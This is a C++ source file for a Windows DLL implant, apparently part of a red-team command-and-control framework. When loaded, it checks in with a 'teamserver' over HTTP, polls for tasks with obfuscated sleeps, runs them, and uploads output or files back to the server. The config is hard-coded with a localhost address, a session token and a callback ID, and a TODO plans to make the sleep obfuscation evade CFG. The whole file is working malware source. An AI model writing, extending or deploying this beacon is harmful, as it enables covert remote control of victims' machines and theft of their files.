#include <main.hpp>
#pragma comment(lib,"winhttp.lib")
#pragma comment(lib,"netapi32.lib")

command_output
process_command(
        _In_ const std::string& command_str,
        _In_ const char delimeter,
        _In_ const implant_context& ctx
);


//
// for testing purposes
//
bool read_from_disk(const std::string& file_name, std::string& outbuff) {

    HANDLE hFile = CreateFileA(
        file_name.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if(hFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD file_size = GetFileSize(hFile, nullptr);
    if(file_size == INVALID_FILE_SIZE) {
        return false;
    }

    outbuff.resize(file_size);
    DWORD bytesread = 0;
    if(!ReadFile(
        hFile,
        outbuff.data(),
        file_size,
        &bytesread,
        nullptr
    ) || bytesread != file_size) {
        return false;
    }

    CloseHandle(hFile);
    return true;
}



bool
receive_commands(implant_context& ctx) {

    std::string task;

    auto _ = defer([&]() {
        if(ctx.hsession != nullptr) {
           WinHttpCloseHandle(ctx.hsession);
        }
        if(ctx.hconnect != nullptr) {
            WinHttpCloseHandle(ctx.hconnect);
        }
    });


    #pragma region init_connection
        if(!networking::http::open_session(ctx.hsession, std::wstring(ctx.user_agent.begin(), ctx.user_agent.end()) )) {
            DEBUG_PRINT("[!] Failed to open new HTTP session!");
            return false;
        }

        if(!networking::http::open_connection(std::wstring(ctx.server_addr.begin(), ctx.server_addr.end()), ctx.port, ctx.hsession, ctx.hconnect)) {
            DEBUG_PRINT("[!] Failed to establish connection with the teamserver.");
            return false;
        }

        if(!networking::http::send_object_message(
            ctx.hconnect,
            ctx.callback_object,
            "checkin",
            ctx.session_token,
            ctx.is_https,
            task
        )) {
            DEBUG_PRINT("[!] Initial teamserver checkin failed. Response: %s\n", task.c_str());
            return false;
        }

        DEBUG_PRINT("[+] Successfully initialized connection with teamserver.\n");
        DEBUG_PRINT("[+] Address: %s Port: %u\n", ctx.server_addr.c_str(), ctx.port);
    #pragma endregion


    while(true) {
        obfus::sleep(ctx.sleep_time);

        #pragma region get_task
            task.clear();
            if(!networking::http::send_object_message(
                ctx.hconnect,
                ctx.callback_object,
                "get_task",
                ctx.session_token,
                ctx.is_https,
                task
            )) {
                DEBUG_PRINT("[*] no task.\n");
                continue;
            }

            DEBUG_PRINT("[+] recieved task: %s\n", task.c_str());
        #pragma endregion


        #pragma region indicate_exit
            if(task == std::string("die") + COMMAND_DELIMITER) {
                networking::http::send_object_message(
                    ctx.hconnect,
                    ctx.callback_object,
                    "indicate_exit",
                    ctx.session_token,
                    ctx.is_https,
                    task
                );

                break;
            }
        #pragma endregion


        #pragma region process_command
            auto [txt_output, file_to_upload, type] = process_command(task, COMMAND_DELIMITER, ctx);
            obfus::sleep(ctx.sleep_time);
            bool success = false;
        #pragma endregion


        #pragma region send_response
            if(type == output_type::PLAIN_TEXT) {
                DEBUG_PRINT("[+] Sending plain text response: %s\n", txt_output.c_str());
                success = networking::http::send_object_message(
                    ctx.hconnect,
                    ctx.callback_object,
                    "complete_task --result " + txt_output,
                    ctx.session_token,
                    ctx.is_https,
                    task
                );
            }

            if(type == output_type::FILE) {
                DEBUG_PRINT("[+] Sending file upload response...");
                success = networking::http::upload_file(
                    ctx.hconnect,
                    ctx.callback_object,
                    file_to_upload,
                    ctx.session_token,
                    ctx.is_https
                );
                CloseHandle(file_to_upload);
            }
        #pragma endregion


        if(success) {
            DEBUG_PRINT("[+] Successfully sent response to: %s\n", ctx.callback_object.c_str());
        } else {
            DEBUG_PRINT("[!] Failed to send response!\n");
        }
    }

    DEBUG_PRINT("[+] Exiting...\n");
    return true;
}



//
// TODO: add CFG valid call targets for sleep obf
//

BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {

    implant_context ctx;
    ctx.callback_object = "fb5fde19-7052-4191-652b-83bd9f0a707f";
    ctx.session_token = "SHBlckk2MHZ3dzk3WWFMTDRWWjlUbkhmaA==";
    ctx.server_addr = "127.0.0.1";
    ctx.port = 8081;
    ctx.is_https = false;
    ctx.user_agent = "test program/1.0";
    ctx.sleep_time = 2500;
    ctx.jitter = 0;

    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            DEBUG_PRINT("[+] process attach.\n");
            if(!receive_commands(ctx)) {
                DEBUG_PRINT("[!] initialization failed.\n");
                return FALSE;
            }

            break;
        case DLL_THREAD_ATTACH:
            DEBUG_PRINT("[+] thread attach.\n");
            break;
        case DLL_THREAD_DETACH:
            DEBUG_PRINT("[+] thread detach.\n");
            break;
        case DLL_PROCESS_DETACH:
            DEBUG_PRINT("[+] process detach.\n");
            break;
    }

    return TRUE;
}
